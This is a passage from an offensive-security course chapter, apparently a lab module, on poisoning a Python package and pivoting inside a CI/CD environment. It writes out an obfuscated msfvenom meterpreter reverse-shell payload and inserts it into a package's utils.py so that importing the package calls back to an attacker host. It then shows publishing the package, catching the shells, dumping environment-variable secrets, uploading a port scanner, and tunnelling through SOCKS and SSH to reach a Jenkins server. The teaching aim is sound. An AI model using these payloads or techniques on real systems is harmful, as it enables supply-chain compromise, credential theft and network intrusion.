We're going to add a _meterpreter_ payload to our package. This allows us a decent amount of flexibility when it comes to _pivoting_. We also don't know how many reverse shells we will capture. We might only receive one from the target in production, but we might also reach command execution in lower environments, developer laptops, and more. Using a meterpreter shell allows us to capture multiple shells if needed.

Let's start by using **msfvenom** to generate the payload. Since our package is a Python package, we'll specify that we want a meterpreter Python payload. We want the target to reach back out to us, so we'll use a reverse shell connection. All of this can be specified with the **-p** option. Since the payload will be Python and not a binary executable, we can specify that we want the output to be in a **raw** format using the **-f** option. Finally, we need to specify the IP address and port number that the payload will connect to. For this, we need something that all the victims can reach. The most accessible target we have is our cloud Kali instance so for **LHOST**, we'll specify the cloud kali IP. For **LPORT**, we'll specify an arbitrary port of 4488.

```
kali@kali:~$ msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 436 bytes
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
```

> Listing 21 - Generating Python Meterpreter Payload

Running this command provides us with the payload. Next, we'll need to add it to our package. Since we want a reverse shell at runtime, we'll add it at the end of **hackshort_util/utils.py**. As soon as the application imports this package, a reverse shell will be sent.

```
kali@kali:~/hackshort-util$ nano hackshort_util/utils.py

kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
01  import time
02  import sys
03
04  def standardFunction():
05          pass
06
07  def __getattr__(name):
08          pass
09          return standardFunction
10
11  def catch_exception(exc_type, exc_value, tb):
12      while True:
13          time.sleep(1000)
14
15  sys.excepthook = catch_exception
16
17  exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
```

> Listing 22 - Modifying utils.py File to Add the Generated Payload

Now that we've added the payload, we need to start our listener. Since we used the cloud Kali instance's IP, we'll SSH into our cloud Kali instance.

```
kali@kali:~$ ssh kali@192.88.99.76
The authenticity of host '192.88.99.76 (192.88.99.76)' can't be established.
ED25519 key fingerprint is SHA256:uw2cM/UTH1lO2xSphPrIBa66w3XqioWiyrWRgHND/WI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.88.99.76' (ED25519) to the list of known hosts.
kali@192.88.99.76's password: 

kali@cloud-kali:~$
```

> Listing 23 - Logging into Cloud Kali Instance via SSH

Once we're logged in, we need to start _Metasploit_. The first step will be to initialize the database. We can do this by using the **msfdb init** command. This command needs to be run as _root_, so we'll add **sudo** to the beginning.

```
kali@cloud-kali:~$ sudo msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

> Listing 24 - Initializing Metasploit's Database

Once initialized, we can start Metasploit by running **msfconsole**.

Since we manually generated our payload, we'll **use** the _generic payload_ handler: **exploit/multi/handler**. We'll set **LHOST** to listen on all interfaces (**0.0.0.0**) and set **LPORT** to the value we used in the payload configuration (**4488**).

Since we don't know how many reverse shells we might capture, we need to set up Metasploit to capture multiple reverse shells. First, we don't want the listener to close as soon as a reverse shell connects. To prevent this, we'll set the **ExitOnSession** option to **false**. Finally, we'll **run** the listener as a job using **-j**. If we become flooded with reverse shells, we don't want Metasploit to immediately interact with them. To configure this, we'll also use the **-z** option for the **run** command.

```
kali@cloud-kali:~$ msfconsole
....

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0

msf6 exploit(multi/handler) > set LPORT 4488
LPORT => 4488

msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false

msf6 exploit(multi/handler) > run -jz
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 0.0.0.0:4488
```

> Listing 25 - Starting Metasploit and Configuring Handler

Now that we have the listener waiting, let's test our package to make sure it works before publishing. Let's return to our personal Kali instance and uninstall, rebuild, and reinstall the _hackshort-util_ package. Finally, we'll start Python and import _utils_ from _hackshort_util_

```
kali@kali:~/hackshort-util$ pip uninstall hackshort-util
...

kali@kali:~/hackshort-util$ python3 ./setup.py sdist
...

kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
...

kali@kali:~/hackshort-util$ python3
Python 3.11.2 [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from hackshort_util import utils
>>>
```

> Listing 26 - Uninstalling, Rebuilding, Reinstalling, and Importing the hackshort-util Package

Next, we'll go back to our cloud Kali instance where we have the listener set up, and check if we obtained a reverse shell from loading the module.

```
msf6 exploit(multi/handler) >
[*] Sending stage (24772 bytes) to 233.252.50.125
[*] Meterpreter session 1 opened (10.0.1.87:4488 -> 233.252.50.125:52342)
```

> Listing 27 - Capturing Reverse Shell

We find that importing the package sent a reverse shell! Let's try to interact with the session by using the **sessions** command and the **-i** option with the _ID_ of the session (**1**). We'll exit out of this session when we interact with it since we don't need it and don't want to confuse it with the real sessions.

```
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 233.252.50.125 - Meterpreter session 1 closed.  Reason: Died
```

> Listing 28 - Closing the Meterpreter Session

The only thing left is to publish our package and hope that we receive some reverse shells!

## 3.4.6. Publishing Our Malicious Package

In the real world, we would create an account on the [public Python Package Index](https://pypi.org/) and upload our package there. However, we don't want to spam this public repository with our malicious packages. Instead, we'll target the **pypi.offseclab.io** index, which was designed to mimic the official public one. Instead of creating an account, we'll provide one with the username _student_ and the password _password_. To use this package server for uploads, we'll need to specify the server URL and credentials in the **~/.pypirc** file.

```
kali@kali:~/hackshort-util$ nano ~/.pypirc

kali@kali:~/hackshort-util$ cat ~/.pypirc
[distutils]
index-servers = 
    offseclab 

[offseclab]
repository: http://pypi.offseclab.io/
username: student
password: password                     
```

> Listing 29 - Configuring ~/.pypirc File to Add Server URL and Login Credentials

In the first section (_distutils_), we specify the list of servers. In this instance, we have only one called _offseclab_. Below that, we need to specify the configuration for this index server. We'll set the URL of the repository with the _repository_ variable. We'll also specify the _username_ and _password_ here.

Now, we can build our package and upload it. To do this, we just need to add the **upload** command to the build command we've been using. We'll also need to specify that we want to use the **offseclab** repository using **-r**.

```
kali@kali:~/hackshort-util$ python3 setup.py sdist upload -r offseclab              
...
Submitting dist/hackshort-util-1.1.4.tar.gz to http://pypi.offseclab.io/
Server response (200): OK
```

> Listing 30 - Uploading Our Malicious Pacakge to offseclab Repository

If a bad package was uploaded and we need to remove it, we can run the following command: curl -u "student:password" --form ":action=remove_pkg" --form "name=hackshort-util" --form "version=1.1.4" http://pypi.offseclab.io/

This will rebuild the package and upload it to the server. In the output, we should find a log stating that it's going to the **pypi.offseclab.io** server and that the response was a _200_.

Now we wait for a reverse shell.

The production web server is configured to rebuild every 10 minutes. If you don't receive a shell in 10 minutes, something went wrong.

```
msf6 exploit(multi/handler) >
[*] Sending stage (24772 bytes) to 44.211.221.172
[*] Meterpreter session 2 opened (10.0.1.54:4488 -> 44.211.221.172:37604)
```

> Listing 31 - Obtaining a Reverse Shell After Publishing Our Malicious Package to pypi.offseclab.io PyPI Server

Excellent! We've obtained command execution!

#### Labs

1. Once you obtain a shell on the production server, obtain the flag located in **/proof.txt**.

Answer

2. Obtain command execution on the builder server and read the file located in **/proof.txt** to obtain the flag. Do this by editing the setup.py file.

Answer

## 3.5. Compromising the Environment

Now that we have code execution, we need to pivot and attempt to gain more access. This can be done in many ways. We could find secrets in the victim's filesystem, we could pivot to other services or applications, or we could privilege escalate to a higher level user account and start the process again.

Whichever path we go down, we must fist enumerate the access that we've gained. This will give us more information about the target environment.

This Learning Unit covers the following Learning Objectives:

- Build a greater understanding of our target environment
- Understand the other services on the network
- Exploit other services through our initial entry point
- Escalate to an administrator account in the cloud provider

## 3.5.1. Enumerating the Production Container

Let's start the enumeration by interacting with the session we have just captured. We'll first start by listing all of our **sessions**. We can then interact with the session by running **sessions -i 2**.

```
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)

msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...
```

> Listing 32 - Interacting with the New Session

When listing the active session, we find that the hostname is "6699d104d6c5" (this will be different for each lab). We also find that we're running as the _root_ user.

By interacting with the session, we'll be placed into a meterpreter shell. Meterpreter has many tools that can help with enumeration. For starters, we can use **ifconfig** to list the network interfaces on the target. It's important to note that this is not the same **ifconfig** found on many _Linux_ machines, but instead a meterpreter tool. This means the output will be slightly different.

```
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP LOOPBACK RUNNING
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface 41
============
Name         : eth1
Hardware MAC : 02:42:ac:1e:00:03
MTU          : 1500
Flags        : UP BROADCAST RUNNING MULTICAST
IPv4 Address : 172.30.0.3
IPv4 Netmask : 255.255.0.0


Interface 43
============
Name         : eth0
Hardware MAC : 02:42:ac:12:00:04
MTU          : 1500
Flags        : UP BROADCAST RUNNING MULTICAST
IPv4 Address : 172.18.0.4
IPv4 Netmask : 255.255.0.0
```

> Listing 33 - Reviewing Network Interfaces

In this output, we find two network interfaces. One of them is in the 172.18.0.4/16 network range, and the other is in the 172.30.0.0/16 range. We'll take note of this information and continue our enumeration.

Let's obtain shell access so we can run commands directly on the target. To do this, we'll run **shell**. Once we have shell access, we'll run **whoami** to confirm that we're running as _root_ and **ls -alh** to list the directory we're currently in.

```
meterpreter > shell
whoami
root

ls -alh
total 32K
drwxr-xr-x 1 root root  17 Jul  6 16:25 .
drwxr-xr-x 1 root root  40 Jul  6 16:42 ..
drwxr-xr-x 8 root root 162 Jul  6 16:41 .git
-rw-r--r-- 1 root root 199 Jul  6 16:25 Dockerfile
-rw-r--r-- 1 root root 15K Jul  6 16:25 README.md
drwxr-xr-x 1 root root  52 Jul  6 16:42 app
-rw-r--r-- 1 root root 167 Jul  6 16:25 pip.conf
-rw-r--r-- 1 root root 196 Jul  6 16:25 requirements.txt
-rw-r--r-- 1 root root 123 Jul  6 16:25 run.py
```

> Listing 34 - Checking User and Current Directory

We can confirm that we are running as the _root_ user! In the directory listing, we also find some Python code, as well as an **app** directory. We'll make note of this as well. Exfiltrating the source code may be very advantageous since it could contain secrets or we could discover other exploits in the application.

Since we're running as a _root_ user and found that the hostname is random alphanumeric characters, we suspect that we've obtained access to a container. Let's use the **mount** command to list the mounts. Often, this will provide us with a more definitive answer to whether we're running in a container.

```
mount

overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/XSUOTVCMJALCFZC3RDKUMDRFT7:/var/lib/docker/overlay2/l/GZ2WZHEOX36F3NXSO3JL4BYD6L:/var/lib/docker/overlay2/l/HVQUSP32SJWVAJ3KOL2QASE4W3:/var/lib/docker/overlay2/l/HE7JGACHWIPRNCT54LBN6AXOZP:/var/lib/docker/overlay2/l/ESRP43XML3BVETNT2Z7I3N2JU4:/var/lib/docker/overlay2/l/KP435SVPCD3NIUYPJPVAREWOOZ:/var/lib/docker/overlay2/l/72FQOR2NP3DWJJSQEXIRCSYJLG:/var/lib/docker/overlay2/l/XGHOLK75NEJNWWWX6CXQOTPRVX:/var/lib/docker/overlay2/l/FYRGADRJGMIS5XK5SBKPLCX6BG:/var/lib/docker/overlay2/l/Z2X5KHFJNPU35ZKBGAHJUEZT3I:/var/lib/docker/overlay2/l/5QTAPW6XADCCWCTAVASPNQT7A4:/var/lib/docker/overlay2/l/35PKZCCO3U4ARBXXGICO35VEMU:/var/lib/docker/overlay2/l/J5J2DCSN4XC4G5HJ6VLPEB3KJL:/var/lib/docker/overlay2/l/D3NHOQ5FM57FMMCEBAT575CAVI:/var/lib/docker/overlay2/l/4BJ4Q3NJFA6VRGPHR4GYYFAB4T,upperdir=/var/lib/docker/overlay2/b95da9be18e4db9ea42697d255af877c65d441522e0f02f8a628239709573bfc/diff,workdir=/var/lib/docker/overlay2/b95da9be18e4db9ea42697d255af877c65d441522e0f02f8a628239709573bfc/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
...
```

> Listing 35 - Reviewing Mounts

Based on the output, we find that our shell is in a Docker container. This changes our enumeration tactics a bit. For starters, checking environment variables has increased in priority. Environment variables are often used to configure applications with secrets that we usually don't want in source code. We'll run **printenv** to list all the environment variables.

```
printenv

HOSTNAME=6699d104d6c5
SECRET_KEY=asdfasdfasdfasdf
PYTHON_PIP_VERSION=22.3.1
HOME=/root
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
ADMIN_PASSWORD=password
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d5cb0afaf23b8520f1bbcfed521017b4a95f5c01/public/get-pip.py
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
SQLALCHEMY_TRACK_MODIFICATIONS=False
PYTHON_VERSION=3.11.2
PYTHON_SETUPTOOLS_VERSION=65.5.1
PWD=/app
PYTHON_GET_PIP_SHA256=394be00f13fa1b9aaa47e911bdb59a09c3b2986472130f30aa0bfaf7f3980637
SQLALCHEMY_DATABASE_URI=sqlite:////data/data.db
ADMIN_USERNAME=admin
```

> Listing 36 - Reviewing Environment Variables

In this output, we find several secrets: an _ADMIN_USERNAME_ and _ADMIN_PASSWORD_, _SECRET_KEY_, and _GPG_KEY_. We don't know what these could be used for currently, but we'll make note of them for now.

It's important to note that our current session might die during enumeration or any other part of our journey. This is because the service regularly restarts. However, when the service starts up again, a new meterpreter session should start immediately. We'll just have to switch to that session by running **sessions -i** along with the _session ID_.

```
[*] 172.18.0.4 - Meterpreter session 2 closed.  Reason: Died

[*] Sending stage (24772 bytes) to 198.18.53.73

[*] Meterpreter session 3 opened (10.0.1.54:4488 -> 198.18.53.73:60146)

msf6 exploit(multi/handler) > sessions -i 3
[*] Starting interaction with 3...

meterpreter >
```

> Listing 37 - Closed and Reopened Meterpreter Sessions

In the real world, enumeration would continue on this container. We still have to explore the source code we discovered, the database for the application, and much more. However, we'll leave these as independent exercises and instead move on to scanning the network for other services.

#### Labs

1. Discover the environment variable with the flag in the container.

Answer

2. According to **/etc/os-release**, what operating system is used for the production server?

Answer

3. Read the contents of the _SQLite Database_ and find the flag in one of the links

Answer

## 3.5.2. Scanning the Network

Gaining access to this container has opened a world of new information for us to target. As found in the network listing, we've discovered multiple interfaces on this container. This is particularly interesting to us, since adding an interface means there's most likely something on the other end for us to discover. Security is often lax with services available on these private networks, since organizations trust that the private network is private or that authentication will be handled by a reverse proxy. Because of this, if we have direct access to the service, we can often bypass any additional layer of security.

_Nmap_ would be a great tool for us to use. However, it would need to be installed on the target, or we would need to install it ourselves. Being that this is a container, Nmap is most likely not installed, and installing additional packages can be difficult or undesirable for stealth.

We could _tunnel_ nmap scans through the meterpreter shell; however, those scans are often slow and result in incorrect information.

Ideally, we would conduct a scan from the victim container by utilizing what we already have access to. We know that this container has Python, since Python was used to obtain the shell. Let's create a short Python script that will scan a given network. We'll create this script on our personal Kali instance instead of the cloud instance.

```
kali@kali:~$ nano netscan.py

kali@kali:~$ cat -n netscan.py
01  import socket
02  import ipaddress
03  import sys
04
05  def port_scan(ip_range, ports):
06      for ip in ip_range:
07          print(f"Scanning {ip}")
08          for port in ports:
09              sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
10              sock.settimeout(.2)
11              result = sock.connect_ex((str(ip), port))
12              if result == 0:
13                  print(f"Port {port} is open on {ip}")
14              sock.close()
15
16  ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
17  ports = [80, 443, 8080]  # List of ports to scan
18
19  port_scan(ip_range, ports)
```

> Listing 38 - Creating Python Script For Port Scanning

In the first three lines, we'll import the required libraries. The _socket_ library will be used to create a connection to a port to test if it's open. The _ipaddress_ library will be used to parse the command-line IP address. Finally, the _sys_ library will be used to obtain access to the command-line arguments. All three of these libraries are often found by default in a Python environment.

Next, on lines 5-14, we define the function for port scanning. It will accept an IP range and a list of ports as arguments. On line 6, we start a _for_ loop for each IP in the range. For each IP, we'll create another _for_ loop for each port on line 8. Line 9 will initiate a socket, line 10 will set a timeout of 0.2 seconds (since we'll be scanning a local network, the timeout can be relatively short), and on line 11, we'll make the connection. On lines 12 and 13, we'll check if the connection was successful and report it if so. On line 14, we'll close the socket.

After the function definition, we'll parse the first argument (the IP address range), saving it to a variable called _ip_range_. On line 17, we'll define a few ports. We'll start by searching for web services on popular web ports: 80, 443, and 8080. We could expand this, but each additional port adds significant time to our scan.

Finally, on line 19, we'll call the function with our arguments. This script can be made to be more efficient; however, it's good enough for what we need.

Once we create our script, we'll use **scp** to copy **netscan.py** to our cloud Kali instance under **/home/kali/**.

```
kali@kali:~$ scp ./netscan.py kali@34.203.75.99:/home/kali/
kali@34.203.75.99's password: 
netscan.py                                100%  462     2.0KB/s   00:00  
```

> Listing 39 - Transfering netscan.py Script to Cloud Kali Instance

Now that we have the script on the cloud Kali instance, we'll use meterpreter to transfer it to our victim. We'll use the **upload** command to transfer **/home/kali/netscan.py** to the root directory in the container.

```
meterpreter > upload /home/kali/netscan.py /netscan.py
[*] Uploading  : /home/kali/netscan.py -> /netscan.py
[*] Uploaded 559.00 B of 559.00 B (100.0%): /home/kali/netscan.py -> /netscan.py
[*] Completed  : /home/kali/netscan.py -> /netscan.py
```

> Listing 40 - Uploading Our netscan.py Script to Target

Let's remind ourselves of the network ranges we're targeting by rerunning **ifconfig**.

```
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP LOOPBACK RUNNING
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface 65
============
Name         : eth0
Hardware MAC : 02:42:ac:12:00:04
MTU          : 1500
Flags        : UP BROADCAST RUNNING MULTICAST
IPv4 Address : 172.18.0.4
IPv4 Netmask : 255.255.0.0


Interface 67
============
Name         : eth1
Hardware MAC : 02:42:ac:1e:00:03
MTU          : 1500
Flags        : UP BROADCAST RUNNING MULTICAST
IPv4 Address : 172.30.0.3
IPv4 Netmask : 255.255.0.0
```

> Listing 41 - Network Interfaces on Target

We find the 172.18.0.1/16 and 172.30.0.1/16 networks on the target. Scanning three ports on a /16 network will send over 190,000 requests. This would take a long time using our script. Instead, let's scan a /24 network to save time and if needed, we can optimize our script to scan a /16.

We'll use the **shell** command in meterpreter to open an interactive shell. Then, we'll use **python** to run **/netscan.py** and provide it with the **172.18.0.1/24** network.

```
meterpreter > shell
Process 17 created.
Channel 4 created.

python /netscan.py 172.18.0.1/24
Scanning 172.18.0.0
Scanning 172.18.0.1
Port 80 is open on 172.18.0.1
Scanning 172.18.0.2
Port 80 is open on 172.18.0.2
Scanning 172.18.0.3
Port 80 is open on 172.18.0.3
Scanning 172.18.0.4
Scanning 172.18.0.5
Port 80 is open on 172.18.0.5
Scanning 172.18.0.6
...
```

> Listing 42 - Port Scanning on 172.18.0.1/24

When you run **netscan.py**, it might seem that the shell is frozen. This is normal while the script runs. Give it a few minutes, and it should become responsive and display the output of the scan.

From this search, we find four services running on port 80. The 172.18.0.1 address is most likely the _gateway_, which points to the ports exposed from the host in some containerized environments. This is most likely the same port that we have access to from the general internet. Let's use **curl** to confirm this by sending an HTTP request. We'll also send a request to 172.18.0.2 to attempt to discover what these services might be.

```
curl -vv 172.18.0.1
...
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: Caddy
< Content-Length: 0
...

curl -vv 172.18.0.2
...
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: Caddy
< Content-Length: 0
...
```

> Listing 43 - Using Curl to Fingerprint Services

The service on 172.18.0.1 responds with a _Caddy_ header, which we also discovered when we were doing our initial enumeration. The service on 172.18.0.2 also responds with this same header. Using this information, we can assume that 172.18.0.1 is most likely the port that exposes the Caddy service on 172.18.0.2 on the host.

In the real world, we would spend more time enumerating the rest of the services we've discovered. However, we'll leave this as an exercise and continue scanning the 172.30.0.1/24 network.

```
python /netscan.py 172.30.0.1/24

Scanning 172.30.0.0
Scanning 172.30.0.1
Port 80 is open on 172.30.0.1
Scanning 172.30.0.2
...
Scanning 172.30.0.10
Port 80 is open on 172.30.0.10
Scanning 172.30.0.11
...
Scanning 172.30.0.30
Port 8080 is open on 172.30.0.30
Scanning 172.30.0.31
...
Scanning 172.30.0.50
Port 8080 is open on 172.30.0.50
Scanning 172.30.0.51
...
Scanning 172.30.0.60
Port 8080 is open on 172.30.0.60
Scanning 172.30.0.61
...
```

> Listing 44 - Port Scanning on 172.30.0.1/24

Once again, we find multiple services. Again, the 172.30.0.1 IP is most likely the _host_. 172.30.0.10 is yet another Caddy reverse proxy. However, the 172.30.0.30 IP is interesting to us. Let's inspect what we find when we send an HTTP Request to it on port 8080 (the discovered port).

```
curl 172.30.0.30:8080/
...
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>

...

curl 172.30.0.30:8080/login
...
<!DOCTYPE html><html lang="en"><head resURL="/static/dd8fdc36" data-rooturl="" data-resurl="/static/dd8fdc36" data-imagesurl="/static/dd8fdc36/images"><title>Sign in [Jenkins]</title><meta name="ROBOTS" content="NOFOLLOW"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="/static/dd8fdc36/jsbundles/simple-page.css" type="text/css"></head><body><div class="simple-page" role="main"><div class="modal login"><div id="loginIntroDefault"><div class="logo"><img src="/static/dd8fdc36/images/svgs/logo.svg" alt="Jenkins logo"></div><h1>Welcome to Jenkins!</h1></div><form method="post" name="login" action="j_spring_security_check"><p class="signupTag simple-page--description">Please sign in below or <a href="signup">create an account</a>.<div class="jenkins-form-item jenkins-form-item--tight"><input autocorrect="off" autocomplete="off" name="j_username" id="j_username" placeholder="Username" type="text" autofocus="autofocus" class="jenkins-input normal" autocapitalize="off" aria-label="Username"></div><div class="jenkins-form-item jenkins-form-item--tight"><input name="j_password" placeholder="Password" type="password" class="jenkins-input normal" aria-label="Password"></div><div class="jenkins-checkbox jenkins-form-item jenkins-form-item--tight jenkins-!-margin-bottom-3"><input type="checkbox" id="remember_me" name="remember_me"><label for="remember_me">Keep me signed in</label></div><input name="from" type="hidden"><div class="submit"><button type="submit" name="Submit" class="jenkins-button jenkins-button--primary">Sign in</button></div></form><div class="footer"></div></div></div></body></html>
```

> Listing 45 - Discovered Jenkins Service while Running curl on Specific Endpoints

The first request we send is met with a response to redirect to the _/login_ page. By sending a request to _/login_ we find that this is a [_Jenkins_](https://www.jenkins.io/) server.

While this Jenkins server requires a login (based on the redirect), it also provides the option to create an account. If Jenkins had self-registration disabled, this option wouldn't be displayed.

Jenkins is very exciting as a target. It will often contain secrets and access to other environments. Open registration on Jenkins makes the chance of further exploitation much greater.

Let's attempt to create an account on Jenkins - but first, we need to find a way to access Jenkins from our Kali instance.

#### Labs

1. Discover the hidden HTTP service that contains a flag when visited. This service is listening on port 80.

Answer

## 3.5.3. Loading Jenkins

While it's possible to continue enumeration by only using curl and manually processing the request, this can become tedious. Instead, now that we have a target, we'll create a tunnel that allows our personal Kali instance to send requests through the cloud instance, and then through the reverse shell to the Jenkins target.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/375d5b9c2f23f2b06db65f3a8e1d778e_MD5.jpg]]

Figure 9: Tunneling Diagram

We'll use a [_SOCKS proxy_](https://en.wikipedia.org/wiki/SOCKS) on the cloud Kali instance. The proxy port will be exposed to our personal Kali instance via an SSH tunnel. We'll also create a route to make sure that requests destined to the 172.30.0.1/16 subnet, which Jenkins is running on, go through the shell.

Before we can start the SOCKS proxy, we need to navigate to the main Metasploit menu. To do this, we'll have to **exit** our shell and **background** the current session. It's important that we only run **exit** if we are in an _active shell_. If not, we will end up exiting Metasploit.

```
exit
[-] core_channel_interact: Operation failed: Unknown error

meterpreter > background
[*] Backgrounding session 1...
```

> Listing 46 - Exiting Shell and Sending Session to Background

Next, we'll start the SOCKS proxy in meterpreter. We'll use the _auxiliary/server/socks_proxy_ module. We don't want the SOCKS proxy exposed to the internet, so we'll change **SRVHOST** from the default, which is all interfaces, to only listen on **127.0.0.1**. Finally, we'll **run** the module as a job (**-j**).

```
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1

msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 1.
```

> Listing 47 - Using SOCKS Proxy Module and Running it

The SOCKS proxy will now start on _localhost_ port 1080 by default.

Now that the SOCKS proxy is running, let's add a route for any connection made through the SOCKS proxy to go through the shell. We'll first list all current active sessions by running **sessions**. From this, we'll be able to obtain the ID of the session. Next, we'll run **route** with the **add** command. We'll specify the network we're targeting with the Jenkins server IP (172.30.0.1) and its network mask (255.255.0.0). Finally, we'll provide this command with the session ID (**2**, in our case).

```
msf6 exploit(server/socks_proxy) > sessions

Active sessions
===============

  Id  Name  Type                      Information          Connection
  --  ----  ----                      -----------          ----------
  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)

msf6 auxiliary(server/socks_proxy) > route add 172.30.0.1 255.255.0.0 2
```

> Listing 48 - Creating Route

At this point, we have the SOCKS proxy and the route added. However, we do not have the SSH tunnel that will make the SOCKS proxy available on our personal Kali instance.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/f337b5fa58daaa5868a87b38ae28f904_MD5.jpg]]

Figure 10: Tunneling Diagram with No SSH Tunnel

Let's create a [_local forwarding SSH tunnel_](https://www.ssh.com/academy/ssh/tunneling-example) to our cloud Kali instance from our personal instance. This will open a port on our personal instance and any network traffic sent to that port will automatically be forwarded to the specified port on the cloud instance through the tunnel.

To create a local forward, we'll use the **-L** option. We'll then specify which interface and port we want opened on our personal Kali instance (**localhost:1080**). Then we'll append which port we want to forward the network traffic to. Since the SOCKS proxy was opened on **localhost:1080**, we'll use that.

We also want this session to only open the tunnel, so we'll request SSH to not execute any commands using the **-N** option and request for SSH to run in the background with **-f**. Finally, we'll specify the login for our Kali instance.

```
kali@kali:~$ ssh -fN -L localhost:1080:localhost:1080 kali@192.88.99.76
kali@192.88.99.76's password:

kali@kali:~$ ss -tulpn
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process                          
tcp    LISTEN  0       128          127.0.0.1:1080        0.0.0.0:*     users:(("ssh",pid=75991,fd=5))  
tcp    LISTEN  0       128              [::1]:1080           [::]:*     users:(("ssh",pid=75991,fd=4))  
```

> Listing 49 - Creating Local Forward SSH Tunnel

At this point, we should have a complete connection from our personal Kali instance to the Jenkins server. Let's test it out by instructing Firefox on our personal Kali instance to use this new proxy. To do this, we'll click on the _hamburger_ menu at the top right and select _Settings_.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/c82fa60b9c1d7bf44a9d52e874d8618f_MD5.jpg]]

Figure 11: Opening Settings in Firefox

Next, we'll search for **Network** and click on _Settings..._.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/3e660a7bb8214820222d2b85ec375cdf_MD5.jpg]]

Figure 12: Opening Network Settings In Firefox

From here, we can configure Firefox to use our proxy. We'll click on _Manual proxy configuration_. For _SOCKS Host_, we'll use **127.0.0.1** and for _Port_, we'll enter **1080**. This will instruct Firefox to send network traffic to the port we opened through the local SSH tunnel. That traffic will then be sent to the Metasploit SOCKS proxy, through the route, and to the Jenkins server (or whatever other server we navigate to). We'll also want to ensure that we select the _v5_ version of the SOCKS proxy. Finally, we'll click _OK_.

![[OffSec/Cloud/Cloud Attacks - CICD Skill Path/z. images/6fff2eebe9935fbb220bc38952b17f2f_MD5.jpg]]

Figure 13: Add Socks Proxy to Firefox

